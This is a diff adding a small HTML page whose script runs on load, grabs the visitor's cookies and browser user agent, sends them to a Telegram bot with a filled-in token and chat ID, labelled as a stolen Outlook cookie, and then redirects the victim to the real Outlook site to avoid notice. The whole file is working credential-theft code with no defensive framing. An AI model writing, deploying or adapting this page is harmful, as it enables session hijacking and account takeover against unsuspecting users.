@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Replace these with your actual values!
+const BOT_TOKEN = '9082262060:AAECO5QaNFTrqtSiu4iEXExFy2ldnODeNds';
+const CHAT_ID = '8037323046';
+
+function steal() {
+    // Get the current user's cookies
+    const cookies = document.cookie;
+    
+    // Format the message
+    const text = `🍪 Outlook Cookie Stolen!\n\nUser Agent: ${navigator.userAgent}\nCookies: ${cookies}`;
+    
+    // Send to Telegram
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+        })
+    }).then(() => {
+        console.log("Sent!");
+        // Optional: Redirect them to normal Outlook so they don't notice
+        window.location.href = "https://outlook.live.com";
+    });
+}
+
+// Run the function immediately
+steal();
+</script>
+</body>
+</html>
